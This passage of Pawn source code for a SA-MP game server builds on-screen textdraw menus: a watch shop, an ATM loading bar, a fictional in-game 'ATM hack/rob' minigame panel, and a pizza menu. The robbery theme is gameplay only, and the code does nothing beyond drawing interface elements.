		PlayerTextDrawSetProportional(playerid,buyWatch[ playerid ][ 6 ], 1);
		PlayerTextDrawSetShadow(playerid,buyWatch[ playerid ][ 6 ], 1);
		PlayerTextDrawSetSelectable(playerid,buyWatch[ playerid ][ 6 ], 0);
		
		buyWatch[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid,384.000000, 169.000000, "ld_beat:cross");
		PlayerTextDrawBackgroundColor(playerid,buyWatch[ playerid ][ 7 ], 255);
		PlayerTextDrawFont(playerid,buyWatch[ playerid ][ 7 ], 4);
		PlayerTextDrawLetterSize(playerid,buyWatch[ playerid ][ 7 ], 0.500000, 1.000000);
		PlayerTextDrawColor(playerid,buyWatch[ playerid ][ 7 ], -1);
		PlayerTextDrawSetOutline(playerid,buyWatch[ playerid ][ 7 ], 0);
		PlayerTextDrawSetProportional(playerid,buyWatch[ playerid ][ 7 ], 1);
		PlayerTextDrawSetShadow(playerid,buyWatch[ playerid ][ 7 ], 1);
		PlayerTextDrawUseBox(playerid,buyWatch[ playerid ][ 7 ], 1);
		PlayerTextDrawBoxColor(playerid,buyWatch[ playerid ][ 7 ], 255);
		PlayerTextDrawTextSize(playerid,buyWatch[ playerid ][ 7 ], 21.000000, 11.000000);
		PlayerTextDrawSetSelectable(playerid,buyWatch[ playerid ][ 7 ], 0);
		PlayerTextDrawSetSelectable(playerid,buyWatch[ playerid ][ 7 ], 1);
		
    	for( new i = 0; i < 8; i++ ) {
			PlayerTextDrawShow( playerid, buyWatch[ playerid ][ i ] );
		}
		SelectTextDraw( playerid, SRVBOJA1 );
	}
	else if( show == false ) {
		for( new i = 0; i < 8; i ++) {
			PlayerTextDrawHide( playerid, buyWatch[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, buyWatch[ playerid ][ i ] );
			buyWatch[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
		CancelSelectTextDraw( playerid );
	}
}
//------------------------------------------------------------------------------
stock atmLoadingTDControl( playerid, bool:show ) {
	
	if( show == true ) {
	
	    atmrobLoading[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 283.125000, 179.666656, "Loading");
		PlayerTextDrawLetterSize(playerid, atmrobLoading[ playerid ][ 0 ], 0.449999, 1.600000);
		PlayerTextDrawAlignment(playerid, atmrobLoading[ playerid ][ 0 ], 1);
		PlayerTextDrawColor(playerid, atmrobLoading[ playerid ][ 0 ], -1);
		PlayerTextDrawSetShadow(playerid, atmrobLoading[ playerid ][ 0 ], 0);
		PlayerTextDrawSetOutline(playerid, atmrobLoading[ playerid ][ 0 ], 1);
		PlayerTextDrawBackgroundColor(playerid, atmrobLoading[ playerid ][ 0 ], 51);
		PlayerTextDrawFont(playerid, atmrobLoading[ playerid ][ 0 ], 2);
		PlayerTextDrawSetProportional(playerid, atmrobLoading[ playerid ][ 0 ], 1);

		atmrobLoading[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 309.750000, 193.499969, "0%");
		PlayerTextDrawLetterSize(playerid, atmrobLoading[ playerid ][ 1 ], 0.371249, 1.150831);
		PlayerTextDrawAlignment(playerid, atmrobLoading[ playerid ][ 1 ], 1);
		PlayerTextDrawColor(playerid, atmrobLoading[ playerid ][ 1 ], -1);
		PlayerTextDrawSetShadow(playerid, atmrobLoading[ playerid ][ 1 ], 0);
		PlayerTextDrawSetOutline(playerid, atmrobLoading[ playerid ][ 1 ], 1);
		PlayerTextDrawBackgroundColor(playerid, atmrobLoading[ playerid ][ 1 ], 51);
		PlayerTextDrawFont(playerid, atmrobLoading[ playerid ][ 1 ], 2);
		PlayerTextDrawSetProportional(playerid, atmrobLoading[ playerid ][ 1 ], 1);
	
		for( new i = 0; i < 2; i++) {
			PlayerTextDrawShow( playerid, atmrobLoading[ playerid ][ i ] );
		}
	}
	else if( show == false ) {
		for( new i = 0; i < 2; i ++) {
			PlayerTextDrawHide( playerid, atmrobLoading[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, atmrobLoading[ playerid ][ i ] );
			atmrobLoading[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}
stock atmTDControl( playerid, bool:show ) {
	
	if( show == true ) {
	    atmTD[ playerid ][ 0 ] = CreatePlayerTextDraw( playerid, 539.000000, 344.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 0 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 0 ], 1);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 0 ], 0.500000, 8.600002);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 0 ], -1);
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 0 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 0 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 0 ], 1);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 0 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 0 ], 85);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 0 ], 170.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 0 ], 0);

		atmTD[ playerid ][ 1 ] = CreatePlayerTextDraw( playerid, 165.000000, 353.000000, "1");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 1 ], 0);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 1 ], 5);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 1 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 1 ], -1);
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 1 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 1 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 1 ], 0);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 1 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 1 ], 255);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 1 ], 155.000000, 71.000000);
		PlayerTextDrawSetPreviewModel( playerid, atmTD[ playerid ][ 1 ], 335);
		PlayerTextDrawSetPreviewRot( playerid, atmTD[ playerid ][ 1 ], 0.0, 0.0, 0.0, 1.3 );
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 1 ], 1);

		atmTD[ playerid ][ 2 ] = CreatePlayerTextDraw( playerid, 300.000000, 330.000000, "2");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 2 ], 0);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 2 ], 5);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 2 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 2 ], -1);
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 2 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 2 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 2 ], 0);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 2 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 2 ], 255);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 2 ], 155.000000, 94.000000);
		PlayerTextDrawSetPreviewModel( playerid, atmTD[ playerid ][ 2 ], 2190 );
		PlayerTextDrawSetPreviewRot( playerid, atmTD[ playerid ][ 2 ], 0.0, 0.0, 180.0, 2.0);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 2 ], 1);

		atmTD[ playerid ][ 3 ] = CreatePlayerTextDraw( playerid, 392.000000, 326.000000, "3");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 3 ], 0);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 3 ], 5);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 3 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 3 ], -1);
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 3 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 3 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 3 ], 0);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 3 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 3 ], 255);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 3 ], 155.000000, 94.000000);
		PlayerTextDrawSetPreviewModel( playerid, atmTD[ playerid ][ 3 ], 1212 );
		PlayerTextDrawSetPreviewRot( playerid, atmTD[ playerid ][ 3 ], -50.0, 0.0, 0.0, 2.0);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 3 ], 1);

		atmTD[ playerid ][ 4 ] = CreatePlayerTextDraw( playerid, 539.000000, 344.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 4 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 4 ], 1);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 4 ], 0.500000, -0.399996);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 4 ], SRVBOJA1 );
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 4 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 4 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 4 ], 1);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 4 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 4 ], 865730559);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 4 ], 170.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 4 ], 0);

		atmTD[ playerid ][ 5 ] = CreatePlayerTextDraw( playerid, 539.000000, 427.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 5 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 5 ], 1);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 5 ], 0.500000, -0.699997);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 5 ], SRVBOJA1 );
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 5 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 5 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 5 ], 1);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 5 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 5 ], 865730559);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 5 ], 170.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 5 ], 0);

		atmTD[ playerid ][ 6 ] = CreatePlayerTextDraw( playerid, 176.000000, 345.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 6 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 6 ], 1);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 6 ], 0.500000, 8.500001);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 6 ], SRVBOJA1 );
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 6 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 6 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 6 ], 1);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 6 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 6 ], 865730559);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 6 ], 170.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 6 ], 0);

		atmTD[ playerid ][ 7 ] = CreatePlayerTextDraw( playerid, 539.000000, 344.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 7 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 7 ], 1);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 7 ], 0.500000, 8.600003);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 7 ], SRVBOJA1 );
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 7 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 7 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 7 ], 1);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 7 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 7 ], 865730559);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 7 ], 533.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 7 ], 0);

		atmTD[ playerid ][ 8 ] = CreatePlayerTextDraw( playerid, 281.000000, 344.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 8 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 8 ], 1);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 8 ], 0.500000, 8.600003);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 8 ], SRVBOJA1 );
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 8 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 8 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 8 ], 1);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 8 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 8 ], 865730559);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 8 ], 275.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 8 ], 0);

		atmTD[ playerid ][ 9 ] = CreatePlayerTextDraw( playerid, 412.000000, 344.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 9 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 9 ], 1);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 9 ], 0.500000, 8.600003);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 9 ], SRVBOJA1 );
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 9 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 9 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 9 ], 1);
		PlayerTextDrawUseBox( playerid, atmTD[ playerid ][ 9 ], 1);
		PlayerTextDrawBoxColor( playerid, atmTD[ playerid ][ 9 ], 865730559);
		PlayerTextDrawTextSize( playerid, atmTD[ playerid ][ 9 ], 406.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 9 ], 0);

		atmTD[ playerid ][ 10 ] = CreatePlayerTextDraw( playerid, 190.000000, 407.000000, "PRESECI ZICE");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 10 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 10 ], 2);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 10 ], 0.270000, 1.200000);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 10 ], -1);
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 10 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 10 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 10 ], 0);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 10 ], 0); // 13

		atmTD[ playerid ][ 11 ] = CreatePlayerTextDraw( playerid, 295.000000, 407.000000, "HAKOVANJE ATMA");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 11 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 11 ], 2);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 11 ], 0.270000, 1.200000);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 11 ], -1);
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 11 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 11 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 11 ], 0);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 11 ], 0);

		atmTD[ playerid ][ 12 ] = CreatePlayerTextDraw( playerid, 430.000000, 407.000000, "KRADJA NOVCA");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 12 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 12 ], 2);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 12 ], 0.270000, 1.200000);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 12 ], -1);
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 12 ], 0);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 12 ], 1);
		PlayerTextDrawSetShadow( playerid, atmTD[ playerid ][ 12 ], 0);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 12 ], 0);

		atmTD[ playerid ][ 13 ] = CreatePlayerTextDraw( playerid, 289.000000, 332.000000, "Atm hack/rob");
		PlayerTextDrawBackgroundColor( playerid, atmTD[ playerid ][ 13 ], 255);
		PlayerTextDrawFont( playerid, atmTD[ playerid ][ 13 ], 1);
		PlayerTextDrawLetterSize( playerid, atmTD[ playerid ][ 13 ], 0.479999, 1.699998);
		PlayerTextDrawColor( playerid, atmTD[ playerid ][ 13 ], -1);
		PlayerTextDrawSetOutline( playerid, atmTD[ playerid ][ 13 ], 1);
		PlayerTextDrawSetProportional( playerid, atmTD[ playerid ][ 13 ], 1);
		PlayerTextDrawSetSelectable( playerid, atmTD[ playerid ][ 13 ], 0);
	
		for( new i = 0; i < 14; i++) {
			PlayerTextDrawShow( playerid, atmTD[ playerid ][ i ] );
		}
		ShowedAtmTD[ playerid ] = true;
	}
	else if( show == false ) {
	    ShowedAtmTD[ playerid ] = false;
		for( new i = 0; i < 14; i ++) {
			PlayerTextDrawHide( playerid, atmTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, atmTD[ playerid ][ i ] );
			atmTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
			CancelSelectTextDraw( playerid );
		}
	}
}
//------------------------------------------------------------------------------
stock PizzaMenuTDControl( playerid, bool:show ) {
	if( show == true ) {
	    PizzaMenu[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid, 543.000000, 89.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 0 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 0 ], 1);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 0 ], 0.500000, 33.099998);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 0 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 0 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 0 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 0 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 0 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 0 ], -1728039937);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 0 ], 95.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 0 ], 0);

		PizzaMenu[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid, 543.000000, 89.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 1 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 1 ], 1);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 1 ], 0.500000, -2.499989);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 1 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 1 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 1 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 1 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 1 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 1 ], -13057);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 1 ], 95.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 1 ], 0);

		PizzaMenu[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid, 219.000000, 70.000000, "Have it your way - eats");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 2 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 2 ], 1);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 2 ], 0.430000, 1.399999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 2 ], -1728039937);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 2 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 2 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 2 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 2 ], 0);

		PizzaMenu[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid, 480.000000, 70.000000, "Los Santos,~n~   winewood");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 3 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 3 ], 2);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 3 ], 0.219999, 0.799998);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 3 ], -1728039937);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 3 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 3 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 3 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 3 ], 0);

		PizzaMenu[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid, 543.000000, 179.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 4 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 4 ], 1);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 4 ], 0.500000, -0.599991);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 4 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 4 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 4 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 4 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 4 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 4 ], -13057);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 4 ], 95.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 4 ], 0);

		PizzaMenu[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid, 543.000000, 284.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 5 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 5 ], 1);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 5 ], 0.500000, -0.599991);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 5 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 5 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 5 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 5 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 5 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 5 ], -13057);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 5 ], 95.000000, 0.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 5 ], 0);

		PizzaMenu[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid, 313.000000, 89.000000, "_");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 6 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 6 ], 1);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 6 ], 0.400000, 33.099998);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 6 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 6 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 6 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 6 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 6 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 6 ], -13057);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 6 ], 307.000000, -5.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 6 ], 0);

		PizzaMenu[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid, 101.000000, 32.000000, "1");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 7 ], 0);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 7 ], 5);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 7 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 7 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 7 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 7 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 7 ], 1);
		PlayerTextDrawUseBox( playerid, PizzaMenu[ playerid ][ 7 ], 1);
		PlayerTextDrawBoxColor( playerid, PizzaMenu[ playerid ][ 7 ], 255);
		PlayerTextDrawTextSize( playerid, PizzaMenu[ playerid ][ 7 ], 221.000000, 140.000000);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 7 ], 1);
		PlayerTextDrawSetPreviewModel( playerid, PizzaMenu[ playerid ][ 7 ], 2218);
		PlayerTextDrawSetPreviewRot( playerid, PizzaMenu[ playerid ][ 7 ], 10.0, -10.0, 220.0, 1.0);

		PizzaMenu[ playerid ][ 8 ] = CreatePlayerTextDraw(playerid, 227.000000, 114.000000, "Capriciosa~n~cedevita~n~pomfrit");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 8 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 8 ], 2);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 8 ], 0.219999, 0.899999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 8 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 8 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 8 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 8 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 8 ], 0);

		PizzaMenu[ playerid ][ 9 ] = CreatePlayerTextDraw(playerid, 240.000000, 154.000000, "68.99 $");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 9 ], 255);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 9 ], 3);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 9 ], 0.470000, 1.799999);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 9 ], -13057);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 9 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 9 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 9 ], 0);
		PlayerTextDrawSetSelectable( playerid, PizzaMenu[ playerid ][ 9 ], 0);

		PizzaMenu[ playerid ][ 10 ] = CreatePlayerTextDraw(playerid, 315.000000, 32.000000, "2");
		PlayerTextDrawBackgroundColor( playerid, PizzaMenu[ playerid ][ 10 ], 0);
		PlayerTextDrawFont( playerid, PizzaMenu[ playerid ][ 10 ], 5);
		PlayerTextDrawLetterSize( playerid, PizzaMenu[ playerid ][ 10 ], 0.500000, 1.000000);
		PlayerTextDrawColor( playerid, PizzaMenu[ playerid ][ 10 ], -1);
		PlayerTextDrawSetOutline( playerid, PizzaMenu[ playerid ][ 10 ], 0);
		PlayerTextDrawSetProportional( playerid, PizzaMenu[ playerid ][ 10 ], 1);
		PlayerTextDrawSetShadow( playerid, PizzaMenu[ playerid ][ 10 ], 1);
